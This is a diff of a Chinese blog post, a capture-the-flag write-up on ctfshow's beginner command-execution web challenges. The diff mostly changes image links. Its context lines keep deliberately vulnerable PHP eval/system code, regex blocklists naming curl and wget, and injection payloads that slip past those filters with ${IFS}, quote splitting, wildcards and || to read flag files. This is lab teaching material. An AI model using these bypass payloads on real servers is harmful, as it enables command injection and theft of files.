@@ -15,16 +15,15 @@
 <meta property="og:site_name" content="林北在这里呀">
 <meta property="og:description" content="ctfshow web入门 命令执行部分(不断更新)">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/images/image-20201029222233995.png">
-<meta property="og:image" content="http://example.com/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/images/image-20201030125022625.png">
-<meta property="og:image" content="http://example.com/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/images/image-20201030133035626.png">
-<meta property="og:image" content="http://example.com/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/images/image-20201030133307452.png">
-<meta property="og:image" content="http://example.com/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/images/1999159-20201008120341520-546479040.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/03/sCVWkD.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/03/sCZpXq.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/03/sCZZ9J.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/03/sCZtgA.png">
 <meta property="article:published_time" content="2020-11-16T13:03:01.000Z">
-<meta property="article:modified_time" content="2021-01-03T12:19:17.029Z">
+<meta property="article:modified_time" content="2021-01-03T13:38:09.356Z">
 <meta property="article:author" content="Wh1tecell">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2020/11/16/ctfshow%20web%20%E5%85%A5%E9%97%A8%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86/images/image-20201029222233995.png">
+<meta name="twitter:image" content="https://s3.ax1x.com/2021/01/03/sCVWkD.png">
   
     <link rel="alternative" href="/atom.xml" title="林北在这里呀" type="application/atom+xml">
   
@@ -185,8 +184,6 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">再补充一下：</span><br><span class="line">对于linux cat和ca&#x27;&#x27;t ca\t ca&quot;&quot;t效果是相同的 这样同样可以绕过字符的限制</span><br><span class="line">比如 c=system(&#x27;ca\t fla\g.php&#x27;);</span><br></pre></td></tr></table></figure>
 
 
-
-
 <h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>过滤了system|flag，用一个代替system()的函数<br><code>payload：?c=passthru(&quot;cat f*&quot;);</code></p>
@@ -236,10 +233,7 @@
 
 <h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>解释一下   </p>
-<p><img src="images/image-20201029222233995.png" alt="image-20201029222233995"></p>
-<blockquote>
 <p><code>/dev/null 2&gt;&amp;1</code></p>
-</blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">分解这个组合：“&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1” </span><br><span class="line"></span><br><span class="line">1：&gt; 代表重定向到哪里，例如：echo &quot;123&quot; &gt; &#x2F;home&#x2F;123.txt</span><br><span class="line">2：&#x2F;dev&#x2F;null 代表空设备文件</span><br><span class="line">3：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1  </span><br><span class="line">4：2&gt;表示错误输出,&amp;表示等同的意思,1标准输出,2&gt;&amp;1就表示错误输出重定向等同于标准输出</span><br></pre></td></tr></table></figure>
 <p><strong>所以&gt;/dev/null 2&gt;&amp;1就表示将标准输出及错误输出全部重定向到“黑洞”</strong></p>
 <p>所以我们要让命令回显，那么进行命令分隔即可</p>
@@ -266,12 +260,12 @@
 <p><code>playload: ?c=nl&lt;fla&#39;&#39;g.php||</code>  通杀</p>
 <h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p> ?c=nl${IFS}fla\g.php||  发现是假的</p>
-<p><img src="images/image-20201030125022625.png" alt="image-20201030125022625"></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sCVWkD"><img src="https://s3.ax1x.com/2021/01/03/sCVWkD.png" alt="sCVWkD.png"></a></p>
 <p>ls一下 </p>
 <p>?c=ls${IFS}/||</p>
-<p><img src="images/image-20201030133035626.png" alt="image-20201030133035626"></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sCZpXq"><img src="https://s3.ax1x.com/2021/01/03/sCZpXq.png" alt="sCZpXq.png"></a></p>
 <p>发现flag在根目录，所以 <code>playload : ?c=nl$&#123;IFS&#125;/fla\g||</code>  (‘cat  / ‘就表示操作根目录下的文件)</p>
-<p><img src="images/image-20201030133307452.png" alt="image-20201030133307452"></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sCZZ9J"><img src="https://s3.ax1x.com/2021/01/03/sCZZ9J.png" alt="sCZZ9J.png"></a></p>
 <h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这题 就不用|| 了</p>
 <p>直接  <code>?c=nl$&#123;IFS&#125;fla\g.php</code></p>
@@ -291,7 +285,7 @@
 <p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p>
 <p>这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</p>
 <p>得到如下：</p>
-<p><img src="images/1999159-20201008120341520-546479040.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sCZtgA"><img src="https://s3.ax1x.com/2021/01/03/sCZtgA.png" alt="sCZtgA.png"></a></p>
 <p>base64解密，即可得到flag</p>
 <p>看了羽大佬的WP还有一种解法</p>
 <p>如下：payload：?c=/???/???/????2 ????.??? —》 然后在url + /flag.php.bz2</p>
@@ -420,11 +414,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/12/12/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8php%E7%89%B9%E6%80%A7%E4%B8%8A/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/11/27/ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8Abypass/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          ctfshowphp特性部分上
+          ping命令执行及bypass
         
       </div>
     </a>
